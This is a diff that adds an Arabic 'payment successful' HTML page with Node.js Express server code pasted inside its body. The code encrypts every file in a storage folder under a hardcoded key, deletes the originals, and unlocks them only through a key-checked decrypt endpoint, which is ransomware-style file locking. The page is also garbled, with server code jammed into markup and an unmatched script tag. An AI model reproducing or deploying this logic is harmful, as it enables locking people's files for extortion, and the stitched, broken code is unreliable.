@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تم الدفع بنجاح</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+            color: #333;
+        }
+        h1 {
+            background-color: #4caf50;
+            padding: 15px 30px;
+            border-radius: 10px;
+            color: white;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+    <h1>تم الدفع بنجاح!</h1>
+    <const express = require('express');
+const fs = require('fs');
+const crypto = require('crypto');
+const bodyParser = require('body-parser');
+
+const app = express();
+const port = 3000;
+const folderPath = './storage';
+const encryptionKey = 'skos';
+const algorithm = 'aes-256-cbc';
+
+app.use(bodyParser.json());
+
+function encryptFiles() {
+    fs.readdirSync(folderPath).forEach(file => {
+        const filePath = `${folderPath}/${file}`;
+        if (fs.lstatSync(filePath).isFile()) {
+            const data = fs.readFileSync(filePath);
+            const cipher = crypto.createCipher(algorithm, encryptionKey);
+            const encryptedData = Buffer.concat([cipher.update(data), cipher.final()]);
+            fs.writeFileSync(`${filePath}.enc`, encryptedData);
+            fs.unlinkSync(filePath);
+        }
+    });
+}
+
+function decryptFiles(key) {
+    if (key !== encryptionKey) return 'مفتاح غير صحيح!';
+    fs.readdirSync(folderPath).forEach(file => {
+        if (file.endsWith('.enc')) {
+            const filePath = `${folderPath}/${file}`;
+            const data = fs.readFileSync(filePath);
+            const decipher = crypto.createDecipher(algorithm, encryptionKey);
+            const decryptedData = Buffer.concat([decipher.update(data), decipher.final()]);
+            fs.writeFileSync(filePath.replace('.enc', ''), decryptedData);
+            fs.unlinkSync(filePath);
+        }
+    });
+    return 'تم فك التشفير بنجاح!';
+}
+
+app.post('/encrypt', (req, res) => {
+    encryptFiles();
+    res.send('تم تشفير الملفات بنجاح!');
+});
+
+app.post('/decrypt', (req, res) => {
+    const { key } = req.body;
+    const message = decryptFiles(key);
+    res.send(message);
+});
+
+app.listen(port, () => {
+    console.log(`الخادم يعمل على http://localhost:${port}`);
+});>
+        console.log("تم تنفيذ الكود بنجاح");
+    </script>
+</body>
+</html>
